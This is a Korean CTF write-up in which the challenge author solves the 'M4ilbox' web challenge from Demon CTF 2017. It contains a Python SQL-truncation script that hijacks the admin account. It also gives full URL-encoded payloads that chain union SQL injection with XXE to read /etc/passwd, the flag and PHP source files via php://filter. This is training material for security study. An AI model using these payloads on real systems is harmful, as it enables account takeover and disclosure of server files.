# WhiteHat League 1 - Demon CTF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
M4ilbox Write-Up - 출제자 풀이
-----------------------------------

## Introduce
* Author : 윤석찬 ([ch4n3](http://chaneyoon.tistory.com))
* Field  : Web Hacking
* E-Mail : chaneyoon@gmail.com
* Date   : 2017-09-12

## Intention
* 전체적인 컨셉으로는 실제 **리얼월드**에서 검색할 때 일어날 수 있는 취약점을 기본으로 함.
* 공격 벡터가 많은 웹 어플리케이션에서 취약한 벡터를 찾는 것이 관건이었음.
* 플래그 형식은 **Demon{...}**

## Solve
* [challenge url](http://108.61.161.168:8080/)

### 1. Functions Analyse
> 1. 먼저 공격 벡터가 있을 만한 기능부터 봐 보자
-   로그인 / 회원가입 기능 (아마도 SQL Injection)
-	메일 보내기 기능
-	중요 메일 확인, 내가 쓴 메일, 내가 받은 메일 확인 기능
-	Members라고 쓰여져 있는 관리자만 사용할 수 있는 기능


저 공격벡터 중에 관리자만 사용할 수 있는 기능이 수상한데,
어드민 권한을 획득하려면 뭔갈 해야하는 듯..?

공격 벡터 중에 어드민의 권한을 가져올 수 있는 방법이 있을까?

> 2. admin 권한 탈취
- 일단 XSS로 admin 권한을 획득할 수 있겠고..
- 만약에 회원가입에서 SQL Injection이 된다면 admin이라는 값을 자신의 임의대로 넣을 수도 있음ㅋㅋ
- 근데 아무리 SQLMAP같은 퍼저를 돌려도 회원가입에서 취약점이 안나올 것이다. 
왜냐면 addslashes()를 사용자의 모든 input에 대해 때려 박았거등요~~~~
- 그럼 역시 XSS로 해야되나.. 생각할 수도 있겠는데
정작 admin의 권한을 얻는 취약점은 회원가입 부분이다.
- 취약점은 바로 SQL Truncation Attack~~~~


다음 코드로 admin의 권한을 획득할 수 있다ㅋㅋㅋㅋ

```{.python}
#!/usr/bin/python
# coding: utf-8

import requests

url = 'http://108.61.161.168:8080/join/ok.php'

data = {
	'firstName'	: 'SoekChan',
	'lastName'	: 'Yoon',
	'age'		: 17,
	'id'		: 'admin' + ' ' * 100 + 'a',
	'password'	: 'tmxkdnjwm123',
	'password_confirmation': 'tmxkdnjwm123'
}

r = requests.post(url, data=data)
print(r.text)
```

> 3. admin 권한 획득 후 공격 진행
- admin 권한을 획득하면 members 탭에서 member들을 검색할 수 있는 권한을 얻는다.
- members에서 id를 입력하고 검색하면 해당 유저에 대한 정보들이 뜬다.
- 근데 정보를 얻는 방식이...?

    http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=admin%26encoding=UTF-8 

- url 파라미터로 넘긴 값에 뭐가 있을지 한 번 들어가보자

    http://108.61.161.168:8080/members/search.php?search=admin&encoding=UTF-8   
- 위의 링크로 접속해보면 **xml 형식**으로 정보를 전달하는 것을 알 수 있다. (~~코럼 행님, XXE각 나오는 부분 ㅇㅈ? ㅇㅇㅈ~~)

> 4. Exploit Using XXE
- search.php 에서 검색을 할 때 **SQL Injection 취약점**이 발생한다는 것을 알 수 있다. 
- 엌ㅋㅋㅋㅋ 그럼 **union based SQLi**를 진행하면 xml 파일 조작 가능하고 고럼 쉽게 뚫릴 것 같은뎈ㅋㅋㅋ
- 근데 union sql injection으로 조작할 수 있는 범위는 한계가 있다. 
- 근데 encoding 파라미터는 뭐지..?
- encoding 파라미터를 변환시켜보면 xml파일의 **Prolog가 변한다**. (~~개꿀~~)
~~encoding값을 변화시켜 xml을 조작하는 것은 전혀 게싱이 아니다. 국내 포털사이트 중 이러한 방법을 통해서 exploit 할 수 있는 곳이 있다ㄷㄷ~~
- 그래서 두 취약점을 합쳐서 XXE를 진행할 수 있다. 
http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-&encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%20%3E]%3E%3C!--
- 이렇게 XXE를 통해서 /etc/passwd를 읽어올 수 있다. 그럼 다시 beautify.php에 url 파라미터로 적절한 url encoding을 사용해서 접속해보자.
http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%20%3E]%3E%3C!--
- 그리고 플래그는 최상위 경로에 있다고 했으니까 file:///flag 를 읽어오면 된다.

> 5. Other Exploit
- XXE를 통해서 읽기 권한이 있는 모든 파일에 접근할 수 있게 되었다. 
- 그럼 해당 어플리케이션의 소스는 볼 수 없을까?
- 당연히 있다. 하지만, 해당 웹 어플리케이션의 절대 경로를 알아내야 한다. ~~슈퍼게싱~~
- 는 구라고 절대경로를 알지 않고서도 소스를 볼 수 있다.
- 바로 /proc/self/cwd 를 이용하면 된다ㅋㅋㅋㅋㅋ
- file:///proc/self/cwd/index.php를 XXE로 읽어오려고 하면 어떤 이유에선지 되지 않는다.
- 하지만, php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php로 읽어올 수 있는 것을 확인했다.
http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/index.php%22%20%3E]%3E%3C!--
- 그리고 웹 디렉토리 최상위 경로에 있는 index.php도 볼 수 있다. 
http://108.61.161.168:8080/members/beautify.php?url=http://108.61.161.168:8080/members/search.php?search=%27union%09select%091,%22--%3E%3Cuser%3E%3Cid%3E%2526xxe;%22,3,4,5,6--%09-%26encoding=UTF-8%22?%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/proc/self/cwd/../index.php%22%20%3E]%3E%3C!--
이렇게
- 그리고 자신이 알고 있는 다른 취약점을 찾아서 exploit 해보면 된다. 
~~근데 나는 모르겠다~~

# 끝

